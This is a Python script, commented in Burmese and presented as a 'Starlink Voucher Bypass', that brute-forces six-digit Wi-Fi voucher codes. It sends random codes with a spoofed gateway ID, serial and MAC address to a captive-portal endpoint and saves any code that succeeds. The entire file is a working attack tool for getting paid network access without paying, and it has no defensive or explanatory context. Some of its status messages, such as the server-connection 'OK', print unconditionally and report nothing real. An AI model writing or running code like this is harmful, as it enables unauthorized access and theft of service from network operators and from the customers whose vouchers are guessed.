import time
import random
import os
import sys
import requests

# အရောင်များ
RED = '\033[91m'      # Fail
GREEN = '\033[92m'    # Success
WHITE = '\033[97m'    
CYAN = '\033[96m'
YELLOW = '\033[93m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def start_scanning():
    os.system('clear')
    
    # ၁။ တစ်ဆင့်ချင်းစာတန်းတက်လာစေရန်
    print(f"{CYAN}[+] Starlink Voucher Bypass Control{END}")
    time.sleep(0.5)
    print(f"{WHITE}[+] Range: 000000 - 999999 (Random Mode){END}")
    time.sleep(0.5)
    print(f"{YELLOW}[!] Scanning in progress...{END}\n")
    
    time.sleep(0.8)
    print(f"{CYAN}[+] Checking Bypass...{END}")
    time.sleep(0.8)
    print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}")
    time.sleep(0.8)
    print(f"{WHITE}[*] Starting Brute-force...{END}\n")
    time.sleep(0.5)

    while True:
        code = str(random.randint(0, 999999)).zfill(6)
        
        # အဖြူရောင် "Trying" စာတန်းကို ဖြုတ်ထားပါသည်
        
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            res = requests.get(url, params=params, timeout=1.5)
            
            # ၂။ Fail ဖြစ်လျှင် အနီရောင်ဖြင့် တန်းစီကျလာမည်
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                print(f"{RED}Fail Code: {code}{END}")
            
            # ၃။ Success ဖြစ်လျှင် အစိမ်းရောင်ဖြင့်ပြမည်
            elif res.status_code == 200:
                print(f"{GREEN}\n[SUCCESS] FOUND VALID VOUCHER: {code}{END}")
                with open("success.txt", "a") as f:
                    f.write(f"Success: {code} | {time.ctime()}\n")
                break
        except Exception:
            # Connection ပြဿနာရှိလျှင်လည်း အနီရောင်ဖြင့်ပြမည်
            print(f"{RED}Error: {code} (No Connection){END}")
        
        time.sleep(0.05)

if __name__ == "__main__":
    start_scanning()
